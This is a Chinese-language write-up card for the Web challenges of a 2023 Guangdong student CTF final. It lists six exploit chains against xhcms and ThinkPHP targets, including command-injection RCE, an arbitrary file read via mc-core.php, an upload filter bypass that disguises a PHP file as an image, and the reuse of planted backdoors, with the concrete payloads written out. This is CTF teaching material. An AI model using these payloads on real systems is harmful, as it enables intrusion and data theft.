---
title: "第二届广东大学生网络安全攻防大赛决赛WEB_WP"
category: web
tags: ["广东大学生网络安全攻防大赛决赛", "web", "Web-xhcms", "ThinkPHP", "mc-core.php", "任意文件读取"]
signals: ["广东大学生网络安全攻防大赛决赛 2023", "Web-xhcms", "ThinkPHP", "mc-core.php", "任意文件读取", "文件上传", "后台上传", "RCE", "PHP文件包含", "web_unknown", "Web", "index", "php", "mc-admin"]
difficulty: medium
source: "https://www.ctfiot.com/111689.html"
tools: ["ThinkPHP"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 第二届广东大学生网络安全攻防大赛决赛WEB_WP

> 赛事：广东大学生网络安全攻防大赛决赛 2023 | 方向：web | 难度：medium | 工具：ThinkPHP

## 一句话总结

6道Web题(目录:index.php/mc-admin/mc-files/posts/pages),涵盖xhcms+ThinkPHP+mc-core.php+后台admin/Upload,核心是admin Config改file_type白名单+uploadImages.html上传1.php+JWT验证+后门触发

## 攻击链

1. exp_1: POST /, data={1: system(''cat /flag'')} → 命令注入RCE|exp_2: POST /mc-files/mc-core.php?file=/flag → 任意文件读取|exp_3: POST /index/form/index, form_id=system(''cat /flag'') → ThinkPHP form_id RCE|exp_4: Login admin/000000/aaaa → /admin/Config 改file_type加php → /admin/Upload/uploadImages.html 上传1.php → /uploads/admin/201910/q.php RCE|exp_5: POST /uploads/admin/201910/this_is_big.php x=cat /flag|exp_6: GET /index/index/shell + Cookie PHPSESSID → /uploads/.bk.php system(''cat /flag'')

## 关键 payload

```
data={"1": "system(''cat /flag'');"}|?file=/flag|form_id="system(''cat /flag'');"|file_type=gif,png,jpg,jpeg,doc,docx,xls,xlsx,csv,pdf,rar,zip,txt,mp4,flv,php,php5|files={''file'': ("1.php", open(''q.php'', ''rb''), "image/jpeg")}|x=cat /flag|cmd=system(''cat /flag'');
```

## 经验教训

1) xhcms架构识别:mc-files/mc-core.php存在file参数可任意文件读; 2) ThinkPHP form_id直接传system()会被eval触发RCE; 3) 后台上传三件套:Login→Config改file_type(白名单)→Upload/uploadImages.html(WU_FILE_0表单)上传1.php改Content-Type image/jpeg绕; 4) 目录穿越title=../templates/index.html可SSTI; 5) 启动index/index/shell路径生成/.bk.php后门文件→POST cmd=system(); 6) this_is_big.php固定文件名是上一道题留下的后门

## 标签

Web-xhcms、ThinkPHP、mc-core.php、任意文件读取、文件上传、后台上传、RCE、PHP文件包含

## 参考来源

- https://www.ctfiot.com/111689.html
- 原文件：第二届广东大学生网络安全攻防大赛决赛WEB_WP.full.md
